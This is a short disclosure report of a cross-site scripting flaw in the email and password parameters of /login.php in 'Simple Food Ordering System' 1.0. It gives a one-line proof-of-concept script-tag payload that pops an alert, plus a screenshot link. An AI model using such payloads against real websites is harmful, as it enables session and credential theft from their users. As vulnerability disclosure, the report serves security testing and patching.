# Simple Food Ordering System-XSS

### Date: 

> ### 2022-08/05



### Exploit Author:

> ### anx0ing@gmail.com



### Vendor Homepage: 

> [https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

> https://www.sourcecodester.com/php/15418/simple-food-ordering-system-client-side-phpmysqli-free-source-code.html



### Version: 

> ### 1.0



### /login.php

`email`、`password`Parameters have Cross Site Scripting(XSS)

> POC

```
"><ScRiPt>alert(1)</sCrIpT>
```

![image-20220805231408483](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220805231408483.png)
